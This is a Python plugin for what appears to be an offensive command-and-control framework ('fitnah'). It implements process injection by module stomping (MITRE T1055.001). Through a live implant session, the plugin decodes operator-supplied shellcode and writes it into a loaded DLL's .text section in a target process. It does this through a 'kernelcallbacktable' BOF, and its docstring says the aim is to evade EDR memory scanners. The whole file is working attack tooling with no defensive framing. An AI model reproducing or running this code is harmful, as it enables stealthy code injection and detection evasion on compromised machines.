"""defense_evasion/module_stomp — overwrite a loaded module's .text section with shellcode. MITRE T1055.001

Sends shellcode to the implant to write into the slack space of a loaded DLL's
.text section. The shellcode executes in memory backed by a legitimate mapped DLL —
no unbacked MEM_PRIVATE shellcode allocation visible to EDR memory scanners.
"""
import base64
from pathlib import Path
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ModuleStomp(BasePlugin):
    NAME        = "module_stomp"
    DESCRIPTION = "Write shellcode into a loaded DLL's .text section (module stomping). No PowerShell."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1055.001"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema().add(
        Param("pid",           int, required=True,  help="Target PID"),
        Param("shellcode_b64", str, required=True,  help="Base64-encoded shellcode"),
        Param("module_name",   str, required=False, default="",
              help="DLL name to stomp (default: let implant choose a sacrificial module)"),
    )

    @mitre("T1055.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        pid    = int(params["pid"])
        sc     = base64.b64decode(params["shellcode_b64"].strip())
        # Use kernelcallbacktable BOF — overwrites module memory via KernelCallbackTable
        args   = ctx.bof_pack("ib", pid, sc)
        r      = ctx.bof("kernelcallbacktable", args_b64=args, timeout=30)
        if r["status"] != "ok":
            return ModuleResult.err(f"module_stomp failed: {r['output']}")
        return ModuleResult.ok(data=r["output"])
